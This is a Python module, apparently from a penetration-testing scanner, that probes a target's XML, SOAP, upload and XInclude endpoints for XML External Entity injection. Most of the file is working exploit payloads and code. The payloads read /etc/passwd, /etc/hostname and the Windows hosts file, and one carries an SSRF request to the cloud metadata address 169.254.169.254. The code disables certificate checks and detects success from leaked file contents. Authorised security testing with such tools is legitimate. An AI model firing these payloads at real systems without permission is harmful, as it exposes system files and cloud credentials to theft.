"""Module 28 — XXE (XML External Entity) Testing.

Tests for XML External Entity injection in XML parsers,
SOAP endpoints, SVG uploads, and file upload functionality.
"""

import json
import logging
from pathlib import Path

import requests

logger = logging.getLogger("cyberpulse.modules.m28")

# XXE payloads for different scenarios
XXE_PAYLOADS = {
    "basic_file": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    "basic_file_win": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>',
    "ssrf": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    "parameter_entity": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///dev/null\'>">%eval;%exfil;]><root>test</root>',
    "cdata": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><![CDATA[&xxe;]]></root>',
    "utf7": '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-',
    "xinclude": '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
}

# SOAP test payloads
SOAP_XXE = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <test>&xxe;</test>
  </soapenv:Body>
</soapenv:Envelope>"""

# Endpoints that commonly accept XML
XML_ENDPOINTS = [
    "/api", "/api/v1", "/api/v2", "/soap", "/wsdl", "/xml",
    "/xmlrpc.php", "/xmlrpc", "/api/xml", "/rest",
    "/service", "/services", "/ws", "/exchange",
    "/saml", "/saml/sso", "/adfs/ls",
]


class Scanner:
    name = "XXE Testing"
    phase = "exploitation"
    description = "Tests for XML External Entity injection in XML parsers and SOAP endpoints"

    def __init__(self, target: str, output_dir: Path, config: dict):
        self.target = target
        self.output_dir = Path(output_dir)
        self.config = config
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 CyberPulse/1.0"
        self.session.verify = False

    def run(self) -> dict:
        findings = []
        raw_lines = [f"XXE testing for {self.target}"]
        base_url = self._get_base_url()

        # Phase 1: Find XML-accepting endpoints
        raw_lines.append("\n[Phase 1: XML Endpoint Discovery]")
        xml_endpoints = []
        for path in XML_ENDPOINTS:
            url = base_url + path
            try:
                resp = self.session.post(url,
                    data='<?xml version="1.0"?><root>test</root>',
                    headers={"Content-Type": "application/xml"}, timeout=10)
                if resp.status_code < 500:
                    xml_endpoints.append(path)
                    raw_lines.append(f"  Accepts XML: {path} ({resp.status_code})")
            except Exception:
                continue

            # Also test with text/xml content type
            try:
                resp = self.session.post(url,
                    data='<?xml version="1.0"?><root>test</root>',
                    headers={"Content-Type": "text/xml"}, timeout=10)
                if resp.status_code < 500 and path not in xml_endpoints:
                    xml_endpoints.append(path)
                    raw_lines.append(f"  Accepts text/xml: {path} ({resp.status_code})")
            except Exception:
                continue

        if not xml_endpoints:
            raw_lines.append("  No XML-accepting endpoints found")

        # Phase 2: Test XXE on each endpoint
        raw_lines.append("\n[Phase 2: XXE Payload Testing]")
        for ep in xml_endpoints:
            url = base_url + ep
            raw_lines.append(f"\n  Testing {ep}:")

            for payload_name, payload in XXE_PAYLOADS.items():
                try:
                    resp = self.session.post(url, data=payload,
                        headers={"Content-Type": "application/xml"}, timeout=15)

                    if self._xxe_successful(resp):
                        raw_lines.append(f"    XXE ({payload_name}): VULNERABLE!")
                        findings.append({
                            "type": "xxe_injection",
                            "endpoint": ep,
                            "payload_type": payload_name,
                            "detail": f"XXE injection ({payload_name}) successful at {ep}",
                            "severity": "critical",
                        })
                        break  # Found one, no need to test more payloads
                    else:
                        raw_lines.append(f"    XXE ({payload_name}): not vulnerable")
                except Exception as e:
                    raw_lines.append(f"    XXE ({payload_name}): error - {e}")

        # Phase 3: SOAP-based XXE
        raw_lines.append("\n[Phase 3: SOAP XXE]")
        soap_paths = ["/soap", "/wsdl", "/ws", "/service", "/services",
                       "/xmlrpc.php", "/xmlrpc"]
        for path in soap_paths:
            url = base_url + path
            try:
                resp = self.session.post(url, data=SOAP_XXE,
                    headers={"Content-Type": "text/xml; charset=utf-8",
                             "SOAPAction": ""},
                    timeout=15)
                if self._xxe_successful(resp):
                    raw_lines.append(f"  SOAP XXE at {path}: VULNERABLE!")
                    findings.append({
                        "type": "xxe_soap",
                        "endpoint": path,
                        "detail": f"SOAP-based XXE injection at {path}",
                        "severity": "critical",
                    })
            except Exception:
                continue

        # Phase 4: SVG XXE
        raw_lines.append("\n[Phase 4: SVG-based XXE]")
        svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
        upload_paths = ["/upload", "/api/upload", "/images/upload",
                        "/api/files", "/api/avatar"]
        for path in upload_paths:
            url = base_url + path
            try:
                resp = self.session.post(url,
                    files={"file": ("test.svg", svg_xxe.encode(), "image/svg+xml")},
                    timeout=15)
                if self._xxe_successful(resp):
                    raw_lines.append(f"  SVG XXE at {path}: VULNERABLE!")
                    findings.append({
                        "type": "xxe_svg",
                        "endpoint": path,
                        "detail": f"SVG-based XXE at file upload endpoint {path}",
                        "severity": "critical",
                    })
            except Exception:
                continue

        # Phase 5: XInclude
        raw_lines.append("\n[Phase 5: XInclude Injection]")
        for ep in xml_endpoints:
            url = base_url + ep
            try:
                resp = self.session.post(url, data=XXE_PAYLOADS["xinclude"],
                    headers={"Content-Type": "application/xml"}, timeout=10)
                if self._xxe_successful(resp):
                    raw_lines.append(f"  XInclude at {ep}: VULNERABLE!")
                    findings.append({
                        "type": "xxe_xinclude",
                        "endpoint": ep,
                        "detail": f"XInclude injection at {ep}",
                        "severity": "critical",
                    })
            except Exception:
                continue

        raw_output = "\n".join(raw_lines)
        outfile = self.output_dir / "28_xxe.json"
        with open(outfile, "w", encoding="utf-8") as f:
            json.dump({"findings": findings}, f, indent=2)

        logger.info("XXE scan %s: %d findings", self.target, len(findings))
        return {"findings": findings, "raw_output": raw_output}

    def _xxe_successful(self, resp) -> bool:
        """Check if response indicates successful XXE."""
        if not resp or resp.status_code >= 500:
            return False

        body = resp.text
        indicators = [
            "root:", "daemon:", "/bin/bash", "/bin/sh",     # /etc/passwd
            "localhost", "127.0.0.1",                        # /etc/hosts
            "ami-id", "instance-id",                         # AWS metadata
            "WINDOWS", "drivers",                            # Windows files
        ]
        return any(ind in body for ind in indicators)

    def _get_base_url(self) -> str:
        for scheme in ("https", "http"):
            try:
                self.session.head(f"{scheme}://{self.target}", timeout=5)
                return f"{scheme}://{self.target}"
            except Exception:
                continue
        return f"http://{self.target}"
